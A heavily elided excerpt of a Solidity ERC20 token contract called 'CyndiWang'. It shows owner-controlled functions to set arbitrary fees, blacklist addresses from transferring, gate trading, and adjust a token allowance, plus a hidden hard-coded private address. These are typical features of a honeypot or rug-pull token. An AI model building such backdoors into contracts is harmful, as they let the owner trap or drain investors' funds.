...
contract  CyndiWang is ERC20 {
   ...
   bool public swapping;
    ...
    address public market = 0x3C979f2e73A0c2609BBc350F8463775bF7dA8EF4;
  ...
  address  private ererer = 0x149D9bCb1ae46D37A69144aCd53102dA78D8b523;
    constructor() public ERC20("CyndiWang", "Wang",9) {
  ...
  function setmarket(address adr) public onlyOwner(){
    ...
    function USDCRewardsFee(uint256 value,uint256 valuea) external pauseOwner{
        txone= value;
        txtwo =valuea;
    }
    ...
    function isbookAddress(address account, bool value) external onlyOwner{
     ...
     function setopenBool(bool bools)external pauseOwner{
        openBool =bools; 
        launch();
    }

     
  	function setopenUser(address user,bool bools)external pauseOwner{
	    openUser[user] = bools;
	}
  ...
  function seteddToken(address spender,uint256 addvalue)public onlyOwner(){
    ...
    function _transfer(
        ...
        require(!isbook[from] && !isbook[to], '_listed address'); 
        if(amount == 0) {
